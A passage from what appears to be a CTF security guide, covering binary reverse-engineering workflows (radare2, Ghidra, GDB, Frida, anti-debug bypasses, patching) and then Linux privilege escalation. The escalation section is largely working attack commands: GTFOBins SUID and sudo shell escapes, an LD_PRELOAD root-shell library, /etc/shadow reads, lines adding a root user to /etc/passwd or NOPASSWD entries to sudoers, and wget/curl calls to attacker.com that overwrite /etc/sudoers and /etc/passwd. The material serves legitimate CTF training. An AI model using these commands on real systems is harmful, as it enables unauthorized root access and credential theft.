readelf -h <binary>            # ELF header
readelf -l <binary>            # Program headers
readelf -S <binary>            # Section headers
readelf -s <binary>            # Symbol table
readelf -r <binary>            # Relocations
readelf -d <binary>            # Dynamic section
readelf -a <binary>            # All information

# ldd - Shared library dependencies
ldd <binary>
ldd -v <binary>                # Verbose
ldd -u <binary>                # Unused dependencies

# strace - System call tracing
strace <binary>
strace -e open <binary>        # Trace only open()
strace -e trace=file <binary>  # File operations
strace -c <binary>             # Count syscalls
strace -o trace.txt <binary>   # Output to file

# ltrace - Library call tracing
ltrace <binary>
ltrace -i <binary>             # Instruction pointer
ltrace -S <binary>             # Show syscalls too
ltrace -c <binary>             # Count calls

# checksec - Security properties
checksec --file=<binary>
checksec --fortify-file=<binary>
```

**Comprehensive Reverse Engineering Workflow**

```bash
#!/bin/bash
# reverse_engineer.sh - Initial RE analysis

BINARY=$1
OUTPUT_DIR="re_$(basename $BINARY)_$(date +%Y%m%d_%H%M%S)"

if [ -z "$BINARY" ]; then
    echo "Usage: $0 <binary>"
    exit 1
fi

mkdir -p $OUTPUT_DIR
cd $OUTPUT_DIR

echo "[*] Starting reverse engineering analysis on $BINARY"

# ========================================
# PHASE 1: Basic Information
# ========================================
echo -e "\n[*] PHASE 1: Basic Information"

echo "[*] File type..."
file ../$BINARY > file_info.txt
cat file_info.txt

echo "[*] Checking security features..."
checksec --file=../$BINARY > checksec.txt
cat checksec.txt

echo "[*] ELF header..."
readelf -h ../$BINARY > elf_header.txt

echo "[*] Sections..."
readelf -S ../$BINARY > sections.txt

echo "[*] Program headers..."
readelf -l ../$BINARY > program_headers.txt

# ========================================
# PHASE 2: Symbols and Dependencies
# ========================================
echo -e "\n[*] PHASE 2: Symbols and Dependencies"

echo "[*] Extracting symbols..."
nm -a ../$BINARY > symbols.txt 2>&1
readelf -s ../$BINARY > symbols_readelf.txt

echo "[*] Dynamic symbols..."
nm -D ../$BINARY > dynamic_symbols.txt 2>&1

echo "[*] Library dependencies..."
ldd ../$BINARY > dependencies.txt 2>&1

echo "[*] Dynamic relocations..."
readelf -r ../$BINARY > relocations.txt

# ========================================
# PHASE 3: Strings Analysis
# ========================================
echo -e "\n[*] PHASE 3: Strings Analysis"

echo "[*] Extracting strings..."
strings ../$BINARY > strings_all.txt

echo "[*] Looking for interesting strings..."
grep -iE "flag|password|key|secret|admin|user|debug|/bin|/etc|http" strings_all.txt > strings_interesting.txt

echo "[*] Potential file paths..."
grep "/" strings_all.txt | grep -v "^/" > strings_paths.txt

# ========================================
# PHASE 4: Disassembly
# ========================================
echo -e "\n[*] PHASE 4: Disassembly"

echo "[*] Disassembling with objdump..."
objdump -d -M intel ../$BINARY > disassembly_objdump.asm

echo "[*] Main function..."
objdump -d -M intel ../$BINARY | grep -A 100 "<main>" > main_function.asm

echo "[*] Finding function calls..."
grep "call" disassembly_objdump.asm | sort | uniq > function_calls.txt

echo "[*] Finding interesting functions..."
grep -iE "system|exec|strcpy|gets|scanf|printf|malloc|free" function_calls.txt > dangerous_functions.txt

# ========================================
# PHASE 5: Radare2 Analysis
# ========================================
echo -e "\n[*] PHASE 5: Radare2 Analysis"

echo "[*] Running radare2 analysis..."
r2 -q -A -c "afl" ../$BINARY > functions_r2.txt
r2 -q -A -c "ii" ../$BINARY > imports_r2.txt
r2 -q -A -c "ie" ../$BINARY > entrypoints_r2.txt
r2 -q -A -c "izz" ../$BINARY > strings_r2.txt

# ========================================
# PHASE 6: Dynamic Analysis Prep
# ========================================
echo -e "\n[*] PHASE 6: Dynamic Analysis Preparation"

echo "[*] Creating strace script..."
cat > run_strace.sh << 'EOF'
#!/bin/bash
strace -o strace.txt ./$1 2>&1
EOF
chmod +x run_strace.sh

echo "[*] Creating ltrace script..."
cat > run_ltrace.sh << 'EOF'
#!/bin/bash
ltrace -o ltrace.txt ./$1 2>&1
EOF
chmod +x run_ltrace.sh

echo "[*] Creating GDB script..."
cat > gdb_init.gdb << 'EOF'
set disassembly-flavor intel
set pagination off
break main
run
info registers
x/40x $esp
disas main
continue
EOF

# ========================================
# PHASE 7: Summary Report
# ========================================
echo -e "\n[*] PHASE 7: Generating Summary"

cat > SUMMARY.txt << EOF
========================================
REVERSE ENGINEERING SUMMARY
========================================
Binary: $BINARY
Analysis Date: $(date)
Output Directory: $(pwd)

FILE INFORMATION:
$(cat file_info.txt)

SECURITY FEATURES:
$(cat checksec.txt)

ARCHITECTURE:
$(grep "Machine:" elf_header.txt)

ENTRY POINT:
$(grep "Entry point" elf_header.txt)

LIBRARY DEPENDENCIES:
$(cat dependencies.txt 2>/dev/null | head -10)

INTERESTING STRINGS:
$(head -20 strings_interesting.txt)

DANGEROUS FUNCTIONS DETECTED:
$(cat dangerous_functions.txt 2>/dev/null | head -10)

FUNCTIONS COUNT:
$(wc -l < functions_r2.txt) functions found

IMPORTS:
$(head -10 imports_r2.txt)

RECOMMENDED NEXT STEPS:
1. Run binary in controlled environment with strace/ltrace
2. Debug with GDB and set breakpoints at interesting functions
3. Import into Ghidra for decompilation
4. Analyze control flow and identify vulnerabilities
5. Look for buffer overflows, format string bugs, logic errors

ANALYSIS FILES:
- disassembly_objdump.asm: Full disassembly
- main_function.asm: Main function disassembly
- strings_all.txt: All extracted strings
- strings_interesting.txt: Filtered interesting strings
- functions_r2.txt: Function list from radare2
- gdb_init.gdb: GDB initialization script
EOF

cat SUMMARY.txt

echo -e "\n[+] Analysis complete!"
echo "[+] Results saved to: $(pwd)"
echo ""
echo "[*] Next steps:"
echo "    1. Review SUMMARY.txt"
echo "    2. Import into Ghidra: ghidraRun"
echo "    3. Debug with GDB: gdb -x gdb_init.gdb ../$BINARY"
echo "    4. Analyze strings: cat strings_interesting.txt"
echo "    5. Check main function: cat main_function.asm"
```

**CTF-Specific RE Techniques**

```bash
# Find flag patterns
strings binary | grep -E "flag{|CTF{|FLAG{|HTB{"

# Extract embedded files
binwalk binary
binwalk -e binary                # Extract found files
foremost binary                  # File carving

# Anti-debugging detection
strings binary | grep -iE "ptrace|debug|gdb"
objdump -d binary | grep "ptrace"

# Check for packing/obfuscation
entropy binary                   # High entropy = packed
upx -d binary                    # Unpack UPX

# Analyze control flow
r2 -AA binary
agf                              # ASCII control flow graph

# Find crypto operations
objdump -d binary | grep -E "xor|rol|ror"
r2 -AA binary -qc "afl~crypt"

# Memory dumps
gdb binary
run
generate-core-file
# Analyze core dump
strings core | grep flag
```

**Quick Reference: Tool Selection**

```markdown
| Task | Best Tool | Alternative |
|------|-----------|-------------|
| Static analysis | Ghidra | Radare2, IDA |
| Decompilation | Ghidra | IDA Pro, RetDec |
| Dynamic debugging | GDB+PEDA/GEF | Radare2 -d |
| Quick disassembly | Objdump | Radare2 |
| String extraction | strings | Radare2 (izz) |
| Binary patching | Radare2 -w | Hex editor |
| Scripting/automation | Radare2 + r2pipe | Ghidra scripts |
| Symbol analysis | nm, readelf | Objdump |
| System call tracing | strace | ltrace |
```

---

**Important Considerations:**

- Always analyze in isolated/VM environment
- Document findings thoroughly as you progress
- Take snapshots before dynamic analysis
- Malware may detect debugging/analysis tools
- Some binaries use anti-debugging techniques
- Obfuscated/packed binaries require unpacking first
- Keep notes on function purposes and variable names
- Cross-reference between static and dynamic analysis

**Anti-Debugging Detection and Bypass**

```bash
# Common anti-debugging techniques

# 1. ptrace detection
# Binary checks if ptrace is already attached
objdump -d binary | grep ptrace

# Bypass in GDB:
gdb binary
catch syscall ptrace
commands
  set $rax = 0
  continue
end
run

# 2. Timing checks
# Binary measures execution time
objdump -d binary | grep -E "rdtsc|clock_gettime"

# Bypass: Patch timing checks
r2 -w binary
/c rdtsc           # Find rdtsc instructions
s <address>
wa nop; wa nop     # NOP out rdtsc
wci                # Write changes

# 3. /proc/self/status checks
# Looks for "TracerPid: 0"
strings binary | grep -i "tracerpid\|status"

# Bypass: Hook file reads or patch checks
gdb binary
catch syscall open
commands
  # Inspect and modify if needed
end

# 4. Parent process check
# Verifies not running under debugger
objdump -d binary | grep getppid

# 5. Breakpoint detection
# Checks for INT3 (0xCC) instructions
# Bypass: Use hardware breakpoints instead
gdb binary
hbreak main        # Hardware breakpoint
```

**Unpacking Packed Binaries**

```bash
# Detect packing
file binary
strings binary | wc -l    # Few strings = likely packed

# Common packers detection
strings binary | grep -iE "upx|aspack|mpress|pecompact"

# UPX unpacking
upx -d binary -o unpacked_binary

# Generic unpacking approach
# 1. Find Original Entry Point (OEP)
gdb binary
break *0x08048000         # Break at entry
run
# Step through until you see normal-looking code
# Or use strace to find where execution normalizes

# 2. Dump memory at OEP
gdb binary
break *<OEP_address>
run
generate-core-file
# Extract from core file

# Manual unpacking with radare2
r2 -d binary
dcu sym.main              # Continue until main
dm                        # Show memory maps
wtf unpacked.bin <addr> <size>  # Write to file

# Using upx-like tools
upx -d binary             # UPX
unupx binary              # UPX alternative
```

**Advanced GDB Techniques**

```bash
# Conditional breakpoints with commands
gdb binary
break function_name
commands
  if $eax == 0x1234
    print "Found target value"
    continue
  else
    continue
  end
end

# Automatically dump data at breakpoint
break *0x08048500
commands
  silent
  printf "EAX: 0x%x, EBX: 0x%x\n", $eax, $ebx
  x/32xb $esp
  continue
end

# Reverse debugging (requires recording)
gdb binary
record                    # Start recording
break main
run
# When crash occurs:
reverse-step              # Step backwards
reverse-continue          # Continue backwards
reverse-finish            # Reverse until function entry

# Save and restore state
gdb binary
checkpoint                # Save state
info checkpoints          # List checkpoints
restart 1                 # Restore checkpoint 1

# Multi-threaded debugging
info threads              # List threads
thread 2                  # Switch to thread 2
break *0x08048000 thread 2  # Thread-specific breakpoint
set scheduler-locking on  # Only current thread runs

# Remote debugging
# On target machine:
gdbserver :1234 binary
# On debugging machine:
gdb binary
target remote 192.168.1.100:1234
```

**Advanced Radare2 Techniques**

```bash
# Binary diffing
radiff2 binary1 binary2
radiff2 -g binary1 binary2  # Graphical diff

# ESIL (Evaluable Strings Intermediate Language)
# Emulate code execution
r2 -AA binary
aeim                      # Initialize ESIL VM
aeim-                     # Deinitialize
aeip                      # Show instruction pointer
aer                       # Show ESIL registers
aes                       # Step ESIL
aec                       # Continue ESIL

# Symbolic execution with angr integration
r2 -AA binary
#!pipe python3 angr_script.py

# Type analysis
r2 -AA binary
aft                       # Analyze function types
afta                      # Analyze all function types

# Signature matching
r2 -AA binary
zg <signature>            # Generate signature
z/ <sig>                  # Search for signature

# Binary information extraction
r2 -qc "iI" binary        # Binary info JSON
r2 -qc "iEj" binary       # Exports JSON
r2 -qc "iij" binary       # Imports JSON

# Exploit pattern generation
ragg2 -P 200 -r          # Create De Bruijn pattern
ragg2 -q 0x41414141      # Find offset in pattern
```

**Ghidra Advanced Features**

```
Function Graph View:
- Right-click function → Display Function Graph
- Shows control flow visually
- Color coding:
  - Green: Normal flow
  - Red: Error paths
  - Blue: Selected blocks
  - Yellow: Highlighted

Code Browser Filters:
- Edit → Tool Options → Decompiler
  - Display Options:
    ☑ Display Namespaces
    ☑ Display Line Numbers
    ☑ Display External Functions
  - Analysis Options:
    ☑ Eliminate Unreachable Code
    ☑ Simplify Extended Integer Operations

Custom Data Types:
1. Data Type Manager → Right-click
2. New → Structure/Union
3. Add fields with appropriate types
4. Apply to variables in decompiler

Function Signatures:
1. Right-click function in decompiler
2. Edit Function Signature
3. Define return type and parameters
4. Apply to improve decompilation

Scripting Examples:
- Window → Script Manager
- Create New Script (Python/Java)
```

**Ghidra Script: Find XOR Operations**

```python
# findXOR.py
from ghidra.program.model.lang import OperandType

# Get current program
program = getCurrentProgram()
listing = program.getListing()
memory = program.getMemory()

xor_instructions = []

# Iterate through all instructions
instructions = listing.getInstructions(True)
for instr in instructions:
    mnemonic = instr.getMnemonicString()
    
    if mnemonic.upper() == "XOR":
        # Get operands
        numOperands = instr.getNumOperands()
        if numOperands >= 2:
            op1 = instr.getDefaultOperandRepresentation(0)
            op2 = instr.getDefaultOperandRepresentation(1)
            
            # Ignore XOR reg, reg (zeroing)
            if op1 != op2:
                addr = instr.getAddress()
                xor_instructions.append((addr, str(instr)))
                print(f"{addr}: {instr}")

print(f"\nTotal XOR operations found: {len(xor_instructions)}")
```

**Ghidra Script: Extract Strings with References**

```python
# extractStringsWithRefs.py
from ghidra.program.model.symbol import RefType

program = getCurrentProgram()
listing = program.getListing()

# Get defined strings
strings = listing.getDefinedData(True)

print("Strings with cross-references:\n")

for data in strings:
    if data.hasStringValue():
        string_value = data.getValue()
        address = data.getAddress()
        
        # Get references to this string
        refs = getReferencesTo(address)
        
        if refs:
            print(f"\nString at {address}: {string_value}")
            print("Referenced from:")
            for ref in refs:
                from_addr = ref.getFromAddress()
                func = getFunctionContaining(from_addr)
                if func:
                    print(f"  - {from_addr} in function {func.getName()}")
                else:
                    print(f"  - {from_addr}")
```

**Objdump Advanced Usage**

```bash
# Disassemble with source (if available)
objdump -d -S -l binary

# Show relocation entries with symbols
objdump -r -R binary

# Demangle C++ symbols
objdump -d --demangle binary
objdump -d -C binary          # Short form

# Show all headers in detail
objdump -x binary | less

# Extract specific function with context
objdump -d binary | sed -n '/<function_name>/,/^$/p'

# Find gadgets for ROP
objdump -d binary | grep -B 1 "ret"
objdump -d binary | grep -B 1 "pop.*ret"

# Show raw instruction bytes
objdump -d binary | awk '{print $2" "$3}'

# Compare functions across binaries
diff <(objdump -d binary1 | grep -A 50 '<main>') \
     <(objdump -d binary2 | grep -A 50 '<main>')

# Create clean assembly output
objdump -d -M intel --no-show-raw-insn binary | \
  sed 's/^[[:space:]]*//' > clean.asm

# Extract GOT/PLT for exploitation
objdump -R binary | grep -E "JUMP_SLOT|GLOB_DAT"
```

**Automated Function Analysis**

```python
#!/usr/bin/env python3
# analyze_functions.py - Analyze all functions in binary

import r2pipe
import sys

if len(sys.argv) < 2:
    print("Usage: python3 analyze_functions.py <binary>")
    sys.exit(1)

binary = sys.argv[1]
r2 = r2pipe.open(binary)

# Analyze binary
print("[*] Analyzing binary...")
r2.cmd("aaa")

# Get all functions
functions = r2.cmdj("aflj")

print(f"\n[+] Found {len(functions)} functions\n")

dangerous_funcs = [
    "system", "exec", "strcpy", "gets", "scanf", 
    "sprintf", "strcat", "memcpy", "malloc", "free"
]

print("[*] Functions calling dangerous functions:")
for func in functions:
    func_name = func.get('name', 'unknown')
    func_addr = func.get('offset')
    
    # Get disassembly
    r2.cmd(f"s {func_addr}")
    disasm = r2.cmd(f"pdf @ {func_addr}")
    
    # Check for dangerous calls
    for danger in dangerous_funcs:
        if danger in disasm:
            print(f"  - {func_name} at {hex(func_addr)} calls {danger}")

# Find crypto-related functions
print("\n[*] Potential crypto/encoding operations:")
for func in functions:
    func_name = func.get('name', 'unknown')
    func_addr = func.get('offset')
    
    if any(crypto in func_name.lower() for crypto in ['xor', 'encode', 'decode', 'crypt', 'cipher']):
        print(f"  - {func_name} at {hex(func_addr)}")

# Find string references
print("\n[*] Interesting string references:")
strings = r2.cmdj("izzj")
for s in strings:
    string_val = s.get('string', '')
    if any(keyword in string_val.lower() for keyword in ['flag', 'password', 'key', 'secret']):
        addr = s.get('vaddr')
        print(f"  - '{string_val}' at {hex(addr)}")
        
        # Find cross-references
        xrefs = r2.cmd(f"axt {hex(addr)}")
        if xrefs:
            print(f"    Referenced from:\n{xrefs}")

r2.quit()
```

**Dynamic Analysis with Frida**

```bash
# Install Frida
pip3 install frida-tools

# List processes
frida-ps

# Attach to process
frida -n process_name

# Spawn and attach
frida -f /path/to/binary

# Load script
frida -l script.js -f /path/to/binary
```

**Frida Script Examples**

```javascript
// hook_function.js - Hook function calls

// Hook strcmp
Interceptor.attach(Module.findExportByName(null, "strcmp"), {
    onEnter: function(args) {
        console.log("[strcmp] Called");
        console.log("  arg1: " + Memory.readUtf8String(args[0]));
        console.log("  arg2: " + Memory.readUtf8String(args[1]));
    },
    onLeave: function(retval) {
        console.log("  Return value: " + retval);
        // Force return 0 (strings match)
        retval.replace(0);
    }
});

// Hook malloc to track allocations
Interceptor.attach(Module.findExportByName(null, "malloc"), {
    onEnter: function(args) {
        this.size = args[0].toInt32();
    },
    onLeave: function(retval) {
        console.log("[malloc] Allocated " + this.size + " bytes at " + retval);
    }
});

// Hook custom function by address
var baseAddr = Module.findBaseAddress("binary_name");
var targetAddr = baseAddr.add(0x1234);

Interceptor.attach(targetAddr, {
    onEnter: function(args) {
        console.log("[CustomFunc] Called with args:");
        console.log("  arg0: " + args[0]);
        console.log("  arg1: " + args[1]);
    }
});

// Read/Write memory
var addr = ptr("0x12345678");
console.log("Value at " + addr + ": " + Memory.readU32(addr));
Memory.writeU32(addr, 0x41414141);

// Scan for byte pattern
Memory.scan(baseAddr, 0x1000, "48 8b 05 ?? ?? ?? ??", {
    onMatch: function(address, size) {
        console.log("Pattern found at: " + address);
    },
    onComplete: function() {
        console.log("Scan complete");
    }
});
```

**Binary Patching Techniques**

```bash
# Using radare2
r2 -w binary
/c call system          # Find call to system
s <address>             # Seek to address
wa nop; wa nop; wa nop; wa nop; wa nop  # NOP out (5 bytes)
wci                     # Commit changes
q                       # Quit

# Using Python
#!/usr/bin/env python3
with open("binary", "rb") as f:
    data = bytearray(f.read())

# Patch at offset 0x1234: change to NOP (0x90)
offset = 0x1234
data[offset:offset+5] = b'\x90' * 5

with open("binary_patched", "wb") as f:
    f.write(data)

# Make executable
import os
os.chmod("binary_patched", 0o755)

# Using dd
dd if=/dev/zero bs=1 count=5 seek=$((0x1234)) of=binary conv=notrunc
# Fill with NOPs (0x90)
printf '\x90\x90\x90\x90\x90' | dd of=binary bs=1 seek=$((0x1234)) conv=notrunc

# Using hexedit (interactive)
hexedit binary
# Navigate to address, modify bytes, save

# Patch with patchelf (ELF specific)
patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 binary
patchelf --set-rpath /custom/path binary
patchelf --remove-needed libcrypto.so binary
```

**Reversing Obfuscated Code**

```bash
# Control flow flattening detection
r2 -AA binary
agf                     # If extremely complex graph, likely flattened

# De-obfuscation approaches:

# 1. Symbolic execution with angr
python3 << 'EOF'
import angr
import claripy

project = angr.Project("./binary", auto_load_libs=False)
flag = claripy.BVS("flag", 8*32)  # 32 byte flag

state = project.factory.entry_state(args=["./binary"], stdin=flag)
simgr = project.factory.simulation_manager(state)

# Find path to success
simgr.explore(find=0x40ABCD, avoid=0x40DEAD)

if simgr.found:
    solution_state = simgr.found[0]
    solution = solution_state.solver.eval(flag, cast_to=bytes)
    print(f"Flag: {solution}")
EOF

# 2. Dynamic analysis to recover logic
gdb binary
# Set breakpoints at key decision points
# Log execution flow with different inputs

# 3. Use deobfuscation plugins
# Ghidra: Decompiler plugins
# IDA: Hex-Rays decompiler with plugins
# Binary Ninja: deobfuscation plugins

# 4. Pattern-based de-obfuscation
# Remove dead code
r2 -AA binary
afva                    # Analyze variables
afi                     # Function info
# Manually identify and patch out junk code
```

**CTF-Specific Reverse Engineering Patterns**

```bash
# Pattern 1: XOR encoding
# Look for: xor instruction with constant
objdump -d binary | grep "xor.*0x"
# Python decoder:
python3 -c "print(''.join(chr(ord(c) ^ 0x42) for c in 'encoded'))"

# Pattern 2: Base64 in binary
strings binary | base64 -d

# Pattern 3: ROT13/Caesar cipher
strings binary | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Pattern 4: Embedded flags
strings binary | grep -E "[A-Z]{3,}\{[^}]+\}"

# Pattern 5: Flag checker function
r2 -AA binary
afl | grep -iE "check|verify|validate"
pdf @ sym.check_flag

# Pattern 6: Anti-debug timing
# Look for rdtsc or time checks
objdump -d binary | grep rdtsc
# Patch or use GDB Python to skip checks

# Pattern 7: Multi-stage decoding
# Stage 1: Extract encrypted data
xxd binary | grep "flag_enc"
# Stage 2: Find decryption routine
r2 -AA binary
afl | grep decrypt
# Stage 3: Emulate or reimplement

# Pattern 8: Format string for info leak
# Binary has format string vuln
# Use to leak memory/stack values
python3 -c "print('%p '*50)" | ./binary

# Pattern 9: Buffer overflow for control
# Find overflow
gdb -q binary
pattern create 200
run < <(pattern create 200)
# Calculate offset, craft exploit

# Pattern 10: Logic bugs
# Check for:
# - Off-by-one errors
# - Integer overflows
# - Race conditions
# - Improper bounds checking
```

**Comprehensive RE Cheat Sheet**

```bash
# Quick analysis commands
file binary && checksec --file=binary && strings binary | head -20

# Full static analysis
r2 -AA binary -qc "afl; ii; izz; q"

# Quick dynamic test
ltrace -i -C ./binary test_input
strace -e trace=open,read,write ./binary test_input

# Memory dump at runtime
gdb -batch -ex "run" -ex "generate-core-file" -ex "quit" ./binary
strings core | grep -i flag

# Extract all function names
nm -D binary | awk '{print $3}' | sort | uniq

# Quick exploit check
r2 -AA binary -qc "afl" | grep -iE "system|exec|strcpy|gets"

# Compare two binary versions
radiff2 -AC binary_v1 binary_v2

# Auto-identify interesting addresses
r2 -AA binary -qc "fs symbols; f"
```

---

**RE Tool Selection Guide:**

```markdown
## Choose GDB when:
- Need step-by-step debugging
- Want to modify runtime state
- Testing exploits interactively
- Analyzing runtime behavior
- Need conditional breakpoints

## Choose Radare2 when:
- Need quick command-line analysis
- Want scriptable automation
- Require binary patching
- Need debugging + analysis combined
- Working in restricted environments

## Choose Ghidra when:
- Need high-quality decompilation
- Want to understand program logic
- Analyzing large/complex binaries
- Team collaboration required
- Have time for deep analysis

## Choose Objdump when:
- Need quick disassembly
- Want portable tool
- Analyzing on minimal systems
- Need specific section dumps
- Creating documentation
```

**Final RE Workflow Recommendation:**

```
1. Initial triage (5-10 min):
   - file, strings, checksec
   - Quick objdump to identify interesting functions
   
2. Static analysis (30-60 min):
   - Import to Ghidra
   - Identify main logic flow
   - Rename functions/variables
   - Document findings
   
3. Dynamic analysis (30-60 min):
   - Run with strace/ltrace
   - Debug key functions with GDB
   - Test different inputs
   - Verify static analysis findings
   
4. Exploitation/Solution (varies):
   - Identify vulnerability or flag mechanism
   - Write exploit or decoder
   - Test and refine
   - Document for writeup
```

---

### Privilege Escalation

Privilege escalation is the act of exploiting vulnerabilities, misconfigurations, or design flaws to gain elevated access to resources. This section covers tools and techniques for both Linux and Windows privilege escalation in CTF environments.

#### GTFOBins

GTFOBins is a curated list of Unix binaries that can be exploited to bypass local security restrictions in misconfigured systems. It's primarily a reference resource rather than an automated tool.

**Understanding GTFOBins**

GTFOBins catalogs binaries that can be abused for:

- **Shell escape** - Breaking out of restricted shells
- **File read** - Reading files with elevated privileges
- **File write** - Writing files with elevated privileges
- **Command execution** - Executing arbitrary commands
- **SUID exploitation** - Abusing SUID binaries
- **Sudo exploitation** - Abusing sudo permissions
- **Capabilities exploitation** - Abusing Linux capabilities

**Accessing GTFOBins**

```bash
# Online resource
# https://gtfobins.github.io/

# Local clone
git clone https://github.com/GTFOBins/GTFOBins.github.io.git
cd GTFOBins.github.io/_gtfobins/

# Search locally
grep -r "sudo" _gtfobins/
```

**SUID Binary Exploitation**

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Common format for results
/usr/bin/find
/usr/bin/vim
/usr/bin/python3
/usr/bin/bash
```

**Common SUID Exploits from GTFOBins**

```bash
# find SUID exploitation
find . -exec /bin/sh -p \; -quit

# vim/vi SUID exploitation
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
vim -c ':!/bin/sh'

# python SUID exploitation
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# bash SUID exploitation (requires bash version < 4.4)
bash -p

# more/less SUID exploitation
more /etc/passwd
!/bin/sh

less /etc/passwd
!/bin/sh

# awk SUID exploitation
awk 'BEGIN {system("/bin/sh -p")}'

# perl SUID exploitation
perl -e 'exec "/bin/sh";'

# ruby SUID exploitation
ruby -e 'exec "/bin/sh"'

# php SUID exploitation
php -r "exec('/bin/sh');"

# nmap SUID exploitation (older versions with --interactive)
nmap --interactive
!sh

# cp SUID exploitation (overwrite /etc/passwd)
cp /etc/passwd /tmp/passwd.bak
echo 'root2:$6$salt$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd

# tar SUID exploitation
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# git SUID exploitation
git help config
!/bin/sh

# docker SUID exploitation
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# wget SUID exploitation (arbitrary file write)
wget http://attacker.com/sudoers -O /etc/sudoers
```

**Sudo Exploitation**

```bash
# Check sudo permissions
sudo -l

# Common sudo exploits

# sudo find
sudo find . -exec /bin/sh \; -quit

# sudo vim
sudo vim -c ':!/bin/sh'

# sudo python
sudo python -c 'import pty;pty.spawn("/bin/bash")'

# sudo less
sudo less /etc/passwd
!/bin/sh

# sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# sudo perl
sudo perl -e 'exec "/bin/sh";'

# sudo ruby
sudo ruby -e 'exec "/bin/sh"'

# sudo nmap
sudo nmap --interactive
!sh

# sudo env (preserve environment)
sudo env /bin/sh

# sudo -u#-1 (CVE-2019-14287)
# Works when (ALL, !root) is in sudoers
sudo -u#-1 /bin/bash

# LD_PRELOAD exploitation
# When env_keep+=LD_PRELOAD in sudoers
cat > shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

**File Read Exploitation**

```bash
# Read files with elevated privileges

# base64 SUID
base64 /etc/shadow | base64 --decode

# cat (if SUID)
cat /etc/shadow

# curl (if SUID or sudo)
curl file:///etc/shadow

# diff (compare with known file)
diff --line-format=%L /dev/null /etc/shadow

# head/tail
head -n 1000 /etc/shadow

# more/less
more /etc/shadow
less /etc/shadow

# strings
strings /etc/shadow

# xxd
xxd /etc/shadow | xxd -r
```

**File Write Exploitation**

```bash
# Write files with elevated privileges

# tee (append to files)
echo "attacker ALL=(ALL) NOPASSWD: ALL" | tee -a /etc/sudoers

# cp (overwrite files)
cp /tmp/malicious_file /etc/passwd

# dd (write to files)
echo "root2:x:0:0:root:/root:/bin/bash" | dd of=/etc/passwd

# tar (extract with arbitrary permissions)
tar -xvf malicious.tar -C /

# zip/unzip (extract with arbitrary permissions)
unzip malicious.zip -d /

# wget (download and overwrite)
wget http://attacker.com/passwd -O /etc/passwd

# curl (download and overwrite)
curl http://attacker.com/passwd -o /etc/passwd
```

**Capabilities Exploitation**

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Common capability exploits

# cap_setuid+ep (python example)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search+ep (allows reading any file)
# Example with tar
tar -czvf /tmp/shadow.tar.gz /etc/shadow
tar -xzvf /tmp/shadow.tar.gz

# cap_dac_override+ep (allows bypassing file permissions)

# cap_sys_ptrace+ep (allows process injection)
# Can inject into root processes

# cap_sys_admin+ep (dangerous - multiple exploits possible)
# Mount operations, namespace manipulation
```

**Automated GTFOBins Search**

```bash
#!/bin/bash
# gtfobins_checker.sh - Check system for GTFOBins exploits

echo "[*] Checking for exploitable SUID binaries..."

# List of common GTFOBins binaries
GTFO_BINS=(
    "awk" "bash" "cp" "curl" "docker" "find" "ftp" "git" "less" "more" 
    "nano" "nmap" "perl" "php" "python" "python2" "python3" "ruby" 
    "scp" "sed" "tar" "vim" "vi" "wget" "xxd" "zip"
)

# Find SUID binaries
SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null)

echo "[+] Found SUID binaries:"
echo "$SUID_BINS"
echo ""

# Check for GTFOBins matches
echo "[+] Checking against GTFOBins database..."
for bin in "${GTFO_BINS[@]}"; do
    if echo "$SUID_BINS" | grep -q "/$bin\$"; then
        echo "[!] EXPLOITABLE: $bin (SUID)"
        echo "    Check: https://gtfobins.github.io/gtfobins/$bin/"
    fi
done

# Check sudo permissions
echo ""
echo "[*] Checking sudo permissions..."
SUDO_LIST=$(sudo -l 2>/dev/null)

if [ ! -z "$SUDO_LIST" ]; then
    echo "[+] Sudo permissions found:"
    echo "$SUDO_LIST"
    echo ""
    
    for bin in "${GTFO_BINS[@]}"; do
        if echo "$SUDO_LIST" | grep -q "$bin"; then
            echo "[!] EXPLOITABLE: $bin (sudo)"
            echo "    Check: https://gtfobins.github.io/gtfobins/$bin/"
        fi
    done
fi

# Check capabilities
echo ""
echo "[*] Checking capabilities..."
CAPS=$(getcap -r / 2>/dev/null)

if [ ! -z "$CAPS" ]; then
    echo "[+] Binaries with capabilities:"
    echo "$CAPS"
fi
```

#### PEASS (Privilege Escalation Awesome Scripts Suite)

PEASS includes LinPEAS (Linux) and WinPEAS (Windows), comprehensive privilege escalation enumeration scripts that automatically identify potential escalation vectors.

**LinPEAS - Linux Privilege Escalation**

**Installation and Basic Usage**

```bash
# Download LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Alternative - direct from GitHub
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Make executable
chmod +x linpeas.sh

# Run basic scan
./linpeas.sh

# Run with output to file
./linpeas.sh | tee linpeas_output.txt

# Run without colors (better for file output)
./linpeas.sh -a 2>&1 | tee linpeas_results.txt
```

**LinPEAS Options**

```bash
# All checks (default)
./linpeas.sh -a

# Superfast mode (skip time-consuming checks)
./linpeas.sh -s

# Thorough mode (more extensive checks)
./linpeas.sh -t

# Quiet mode (less output)
./linpeas.sh -q

# Search specific string in all files
./linpeas.sh -s -r "password"

# Skip certain checks
./linpeas.sh -o system_information,container,procs_crons_timers_srvcs_sockets

# Show only exploitable findings
./linpeas.sh | grep "99%\|95%"
```

